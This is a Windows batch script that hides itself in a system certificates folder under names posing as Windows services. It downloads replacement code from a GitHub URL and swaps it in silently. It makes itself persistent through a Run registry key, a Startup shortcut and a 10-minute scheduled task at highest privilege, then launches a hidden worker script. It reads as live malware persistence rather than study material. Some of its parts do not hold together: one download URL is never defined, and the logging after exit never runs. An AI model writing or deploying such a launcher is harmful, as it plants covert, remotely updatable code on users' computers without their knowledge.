set "LAUNCHER_VERSION=1.1"
set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "workerScriptPath=%secretPath%\restore_worker.bat"
set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"

curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 30 2>nul
if exist "%secretPath%\lv.tmp" (
    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 30 2>nul
        if exist "%launcherScriptPath%.new" (
            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
            start "" /B "%secretPath%\ul.bat"
            goto :eof
        )
    )
)

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
set "targetPath=%launcherScriptPath%"

reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "\"!targetPath!\"" /f >nul
)

if not exist "%shortcutPath%" (
    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut(\"%shortcutPath%\"); $s.TargetPath = \"cmd /c start \"\" /B \"%targetPath%\"\"; $s.Save()" >nul 2>&1
)

schtasks /create /tn "SystemCertService" /tr "\"!targetPath!\"" /sc MINUTE /mo 10 /f /rl HIGHEST >nul 2>&1

if exist "%workerScriptPath%" (
    start "" /B /high "%workerScriptPath%"
)

:eof
endlocal
exit /b




:: Logging
set "logPath=%LOCALAPPDATA%\Microsoft\SystemCertificates\WinLogonSvc.log"
echo %DATE% %TIME% - WinLogonSvc executado. >> "%logPath%"

